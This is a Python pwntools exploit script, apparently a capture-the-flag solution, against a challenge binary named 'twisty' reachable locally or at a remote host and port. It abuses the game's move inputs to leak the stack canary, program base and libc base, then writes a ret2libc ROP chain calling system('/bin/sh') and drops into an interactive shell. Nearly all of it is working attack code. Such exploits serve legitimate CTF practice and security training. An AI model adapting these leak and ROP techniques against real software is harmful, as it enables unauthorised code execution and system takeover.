from pwn import *

# context.log_level = 'debug'
TARGET = './twisty'
HOST = '138.68.67.161'
PORT = 20007 

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()

r.sendlineafter('> ', 'c1u'*2048*2)
for i in range((2048*2)-1):
    r.recvuntil('> ')
# for i in range(2048*2):
    # log.info(i)
    # r.sendlineafter('> ', 'c1u')

for i in range(4):
    r.sendlineafter('> ', 'r3l')
r.sendlineafter('> ', 'l')

def get_num(text):
    if "c0u" in text:
        return 0
    elif "c1u" in text:
        return 1
    elif "c2u" in text:
        return 2
    elif "c3u" in text:
        return 3
    elif "c0d" in text:
        return 4
    elif "c1d" in text:
        return 5
    elif "c2d" in text:
        return 6
    elif "c3d" in text:
        return 7
    elif "r0r" in text:
        return 8
    elif "r1r" in text:
        return 9
    elif "r2r" in text:
        return 10
    elif "r3r" in text:
        return 11
    elif "r0l" in text:
        return 12
    elif "r1l" in text:
        return 13
    elif "r2l" in text:
        return 14
    elif "r3l" in text:
        return 15

def parse(l_num):
    ans = 0
    for i in range(0, len(l_num), 2):
       ans += ((l_num[i] << 4) + l_num[i+1]) << (i*4)
    return ans


raw = r.recvuntil('> ').split(' ')
# print raw
leak = []
for x in raw:
    leak.append(get_num(x))

# print (leak[2048*2:2048*2+4])
# print (leak[2048*2+4:2048*2+4+0xc])
# print hex(parse((leak[2048*2+4+0xc:2048*2+4+0xc+0x10]))), "1"
# print hex(parse((leak[2048*2+4+0xc+0x10:2048*2+4+0xc+0x20]))), "canary"
# print hex(parse((leak[2048*2+4+0xc+0x20:2048*2+4+0xc+0x30]))), "rbp"
# print (leak[2048*2+4+0xc+0x30:2048*2+4+0xc+0x40]), "0"
# print hex(parse((leak[2048*2+4+0xc+0x40:2048*2+4+0xc+0x50]))), "code"
# print hex(parse((leak[2048*2+4+0xc+0x50:2048*2+4+0xc+0x60]))), "code"
# print (leak[2048*2+4+0xc+0x60:2048*2+4+0xc+0x70]), "stack"
# print (leak[2048*2+4+0xc+0x70:2048*2+4+0xc+0x80]), "0"
# print (leak[2048*2+4+0xc+0x80:2048*2+4+0xc+0x90]), "0"
# print hex(parse((leak[2048*2+4+0xc+0x90:2048*2+4+0xc+0xa0]))), "libc"


counter = parse(leak[2048*2:2048*2+4])
canary = parse((leak[2048*2+4+0xc+0x10:2048*2+4+0xc+0x20]))
ret = parse((leak[2048*2+4+0xc+0x60:2048*2+4+0xc+0x70]))-0xd8 
code = parse((leak[2048*2+4+0xc+0x40:2048*2+4+0xc+0x50]))-0xeb0
libc = parse((leak[2048*2+4+0xc+0x90:2048*2+4+0xc+0xa0]))-0x20830 #of

dbg("counter")
dbg("canary")
dbg("ret")
dbg("code")
dbg("libc")

rdi = libc + 0x00020256
binsh = libc + 0x18cd57
system = libc + 0x45390


if args.D:
    debug(r, [0xad1, 0x940])

r.sendline('u'*(0x9b-0x47)) 
for i in range(0x9b-0x48-1):
    r.recvuntil('> ')
    # r.sendlineafter('> ', 'u')

def set_num(num):
    ret = ["c0u", "c1u", "c2u", "c3u", "c0d", "c1d","c2d","c3d","r0r","r1r","r2r","r3r","r0l","r1l","r2l","r3l"]
    return ret[num]

def input_num(number):
    for i in range(0, 0x10, 2):
        dig1 = (number>>(i*4)) & 0xf
        dig2 = (number>>((i+1)*4)) & 0xf
        r.sendlineafter('> ', set_num(dig2))
        r.sendlineafter('> ', set_num(dig1))
    
input_num(rdi)
input_num(binsh)
input_num(0xdeadbeef)
input_num(rdi+2)
input_num(system)

r.interactive()
r.close()
